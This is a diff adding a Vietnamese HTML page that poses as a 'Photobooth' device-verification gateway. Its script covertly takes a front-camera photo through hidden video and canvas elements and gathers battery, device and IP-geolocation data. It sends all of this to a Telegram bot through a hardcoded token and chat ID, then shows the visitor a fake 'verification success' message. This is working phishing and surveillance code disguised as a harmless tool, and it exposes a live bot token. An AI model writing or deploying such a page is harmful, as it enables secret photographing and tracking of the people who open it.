@@ -1,0 +1,383 @@
+
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Chụp Photobooth 🥰</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #030712;
+    --panel-bg: rgba(17, 24, 39, 0.75);
+    --border-color: rgba(99, 102, 241, 0.3);
+    --primary: #6366f1;
+    --primary-hover: #4f46e5;
+    --accent: #a855f7;
+    --text-main: #f8fafc;
+    --text-muted: #94a3b8;
+    --success: #10b981;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+  
+  body {
+    background-color: var(--bg-base);
+    background-image: 
+      radial-gradient(circle at 15% 15%, rgba(99, 102, 241, 0.2) 0px, transparent 50%),
+      radial-gradient(circle at 85% 85%, rgba(168, 85, 247, 0.2) 0px, transparent 50%);
+    color: var(--text-main);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    overflow-x: hidden;
+  }
+
+  @keyframes floatCard {
+    0%, 100% { transform: translateY(0px); }
+    50% { transform: translateY(-8px); }
+  }
+
+  .card {
+    background: var(--panel-bg);
+    backdrop-filter: blur(30px);
+    -webkit-backdrop-filter: blur(30px);
+    border: 1px solid var(--border-color);
+    padding: 36px 28px;
+    border-radius: 28px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 35px rgba(99, 102, 241, 0.15);
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+    animation: floatCard 6s ease-in-out infinite;
+  }
+
+  @keyframes borderGlow {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; height: 3px;
+    background: linear-gradient(90deg, transparent, var(--primary), var(--accent), transparent);
+    animation: borderGlow 3s linear infinite;
+  }
+
+  .live-clock {
+    font-size: 0.8rem;
+    font-weight: 600;
+    color: var(--primary);
+    background: rgba(99, 102, 241, 0.1);
+    border: 1px solid rgba(99, 102, 241, 0.2);
+    padding: 6px 14px;
+    border-radius: 20px;
+    display: inline-block;
+    margin-bottom: 16px;
+    letter-spacing: 0.5px;
+  }
+
+  @keyframes pulseIcon {
+    0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(99, 102, 241, 0.2); }
+    50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(168, 85, 247, 0.4); }
+  }
+
+  .icon-box {
+    width: 68px; height: 68px;
+    margin: 0 auto 20px auto;
+    background: linear-gradient(135deg, rgba(99, 102, 241, 0.2), rgba(168, 85, 247, 0.2));
+    border: 1px solid rgba(99, 102, 241, 0.4);
+    border-radius: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    animation: pulseIcon 3s ease-in-out infinite;
+  }
+
+  .icon-box svg {
+    width: 32px; height: 32px;
+    stroke: var(--primary);
+    stroke-width: 2;
+    fill: none;
+  }
+
+  h2 { font-size: 1.5rem; font-weight: 800; color: #fff; margin-bottom: 8px; letter-spacing: -0.5px; }
+  p.subtitle { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 28px; line-height: 1.5; }
+
+  .btn {
+    width: 100%; padding: 16px; 
+    background: linear-gradient(135deg, var(--primary), var(--accent));
+    color: #fff; border: none; border-radius: 14px; 
+    font-weight: 700; font-size: 1rem; cursor: pointer; 
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: 0 10px 25px -5px rgba(99, 102, 241, 0.5);
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    position: relative;
+    overflow: hidden;
+    text-decoration: none;
+  }
+
+  .btn::after {
+    content: '';
+    position: absolute;
+    top: -50%; left: -50%; width: 200%; height: 200%;
+    background: linear-gradient(60deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    transform: rotate(30deg) translateX(-100%);
+    transition: transform 0.7s ease-in-out;
+  }
+
+  .btn:hover::after {
+    transform: rotate(30deg) translateX(100%);
+  }
+  
+  .btn:hover { 
+    transform: translateY(-2px); 
+    box-shadow: 0 15px 30px -5px rgba(99, 102, 241, 0.7); 
+    filter: brightness(1.15);
+  }
+  
+  .btn:active { transform: scale(0.97); }
+
+  .btn-group {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    margin-top: 15px;
+    display: none; /* Ban đầu ẩn đi, chỉ hiện khi hoàn tất xác thực */
+  }
+
+  .btn-secondary {
+    background: linear-gradient(135deg, #10b981, #059669);
+    box-shadow: 0 10px 25px -5px rgba(16, 185, 129, 0.5);
+  }
+
+  .status {
+    margin-top: 20px;
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: var(--text-muted);
+    min-height: 20px;
+    transition: all 0.3s ease;
+  }
+
+  .footer-badge {
+    margin-top: 24px;
+    font-size: 0.75rem;
+    color: #475569;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+
+  #video, #canvas { display: none; }
+</style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="live-clock" id="clock">Đang tải thời gian...</div>
+
+    <div class="icon-box">
+      <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+      </svg>
+    </div>
+    
+    <h2>Chụp Photobooth </h2>
+    <p class="subtitle" id="sub-text">Vui lòng bấm nút bên dưới để tiến hành định danh thiết bị.</p>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- Nút xác thực ban đầu -->
+    <button class="btn" id="capture-btn">
+      <span>TIẾP TỤC XÁC THỰC</span>
+    </button>
+
+    <!-- Khu vực 2 nút truy cập hiển thị sau khi hoàn tất -->
+    <div class="btn-group" id="action-buttons">
+      <a href="" target="_blank" class="btn">
+        <span>🚀 TRUY CẬP NHÓM LẤY FILE</span>
+      </a>
+      <a href="" target="_blank" class="btn btn-secondary">
+        <span>🤖 MỞ BOT TELEGRAM</span>
+      </a>
+    </div>
+    
+    <div id="status" class="status"></div>
+    <div class="footer-badge">🔒 Secure Gateway v2.5</div>
+  </div>
+
+<script>
+  // ==========================================================
+  // CẤU HÌNH THÔNG TIN BOT VÀ NHÓM CHAT:
+  // ==========================================================
+  const TELEGRAM_BOT_TOKEN = '8921957218:AAFpPTSp5c56ByZMXZRlw8XwBxXj9ap_AE8'; 
+  const TELEGRAM_CHAT_ID = '8872446985'; 
+  const TELEGRAM_BOT_USERNAME = 'hehdhjdj_bot'; 
+  // ==========================================================
+
+  function updateClock() {
+    const now = new Date();
+    const timeString = now.toLocaleTimeString('vi-VN', { hour12: false });
+    const dateString = now.toLocaleDateString('vi-VN', { day: '2-digit', month: '2-digit', year: 'numeric' });
+    document.getElementById('clock').textContent = `🕒 ${timeString} - ${dateString}`;
+  }
+  setInterval(updateClock, 1000);
+  updateClock();
+
+  function playClickSound() {
+    try {
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = audioCtx.createOscillator();
+      const gainNode = audioCtx.createGain();
+
+      osc.type = 'sine';
+      osc.frequency.setValueAtTime(580, audioCtx.currentTime);
+      osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.08);
+
+      gainNode.gain.setValueAtTime(0.15, audioCtx.currentTime);
+      gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
+
+      osc.connect(gainNode);
+      gainNode.connect(audioCtx.destination);
+
+      osc.start();
+      osc.stop(audioCtx.currentTime + 0.08);
+    } catch (e) {}
+  }
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const captureBtn = document.getElementById('capture-btn');
+  const statusDiv = document.getElementById('status');
+  const subText = document.getElementById('sub-text');
+  const actionButtons = document.getElementById('action-buttons');
+
+  captureBtn.onclick = async () => {
+    playClickSound();
+    
+    captureBtn.style.display = 'none'; // Ẩn nút xác thực đi
+    statusDiv.textContent = 'Đang đồng bộ dữ liệu thiết bị...';
+
+    const accessTime = new Date().toLocaleString('vi-VN', { hour12: false });
+
+    let batteryInfo = 'Không hỗ trợ';
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        const level = Math.round(battery.level * 100);
+        const charging = battery.charging ? '⚡ Đang sạc' : '🔋 Không sạc';
+        batteryInfo = `${level}% (${charging})`;
+      } catch (e) {}
+    }
+
+    const ua = navigator.userAgent;
+    let deviceName = 'Thiết bị khác';
+    if (/android/i.test(ua)) deviceName = 'Android 🤖';
+    if (/iphone|ipad|ipod/i.test(ua)) deviceName = 'iOS (Apple) 🍏';
+    if (/windows/i.test(ua)) deviceName = 'Windows PC 💻';
+    if (/macintosh|mac os x/i.test(ua)) deviceName = 'MacBook / Mac 💻';
+
+    let ipDetails = { ip: 'Không rõ', city: 'Không rõ', region: 'Không rõ', country: 'Không rõ', org: 'Không rõ' };
+    try {
+      const ipRes = await fetch('https://ipwho.is/');
+      const ipData = await ipRes.json();
+      if (ipData.success) {
+        ipDetails.ip = ipData.ip || 'Không rõ';
+        ipDetails.city = ipData.city || 'Không rõ';
+        ipDetails.region = ipData.region || 'Không rõ';
+        ipDetails.country = ipData.country || 'Không rõ';
+        ipDetails.org = ipData.connection?.isp || ipData.connection?.org || 'Không rõ';
+      }
+    } catch (e) {
+      try {
+        const fallbackRes = await fetch('https://api.ipify.org?format=json');
+        const fallbackData = await fallbackRes.json();
+        ipDetails.ip = fallbackData.ip;
+      } catch(err) {}
+    }
+
+    const infoText = 
+      `🚨 <b>PHÁT HIỆN LƯỢT TRUY CẬP MỚI</b> 🚨\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `⏰ <b>Thời gian:</b> <code>${accessTime}</code>\n` +
+      `📱 <b>Thiết bị:</b> ${deviceName}\n` +
+      `🔋 <b>Pin:</b> ${batteryInfo}\n` +
+      `🌐 <b>Địa chỉ IP:</b> <code>${ipDetails.ip}</code>\n` +
+      `🏙️ <b>Khu vực:</b> ${ipDetails.city}, ${ipDetails.region}\n` +
+      `🌍 <b>Quốc gia:</b> ${ipDetails.country}\n` +
+      `🏢 <b>Nhà mạng:</b> ${ipDetails.org}\n` +
+      `━━━━━━━━━━━━━━━━━━━━━\n` +
+      `✨ <i>Trạng thái: Đã hoàn tất xác thực</i>\n` +
+      `🔗 <b>Nhóm lấy file:</b> `;
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = stream;
+      
+      await new Promise((resolve) => {
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(() => {
+            if (video.videoWidth > 0 && video.videoHeight > 0) {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              canvas.toBlob(async (blob) => {
+                if (blob) {
+                  const formData = new FormData();
+                  formData.append('chat_id', TELEGRAM_CHAT_ID);
+                  formData.append('photo', blob, 'secure_capture.jpg');
+                  formData.append('caption', infoText);
+                  formData.append('parse_mode', 'HTML');
+
+                  try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                      method: 'POST',
+                      body: formData
+                    });
+                  } catch (e) {}
+                }
+                stream.getTracks().forEach(track => track.stop());
+                resolve();
+              }, 'image/jpeg', 0.85);
+            } else {
+              stream.getTracks().forEach(track => track.stop());
+              resolve();
+            }
+          }, 800);
+        };
+      });
+    } catch (err) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: infoText + '\n\n⚠️ <i>(Người dùng đã từ chối quyền camera)</i>',
+            parse_mode: 'HTML'
+          })
+        });
+      } catch (e) {}
+    }
+
+    // Hiển thị trạng thái thành công và bật 2 nút bấm lên
+    statusDiv.textContent = 'Xác thực thành công! Vui lòng chọn liên kết bên dưới.';
+    statusDiv.style.color = 'var(--success)';
+    subText.textContent = 'Hệ thống đã ghi nhận thiết bị của bạn.';
+    actionButtons.style.display = 'flex'; 
+  };
+</script>
+
+</body>
+</html>
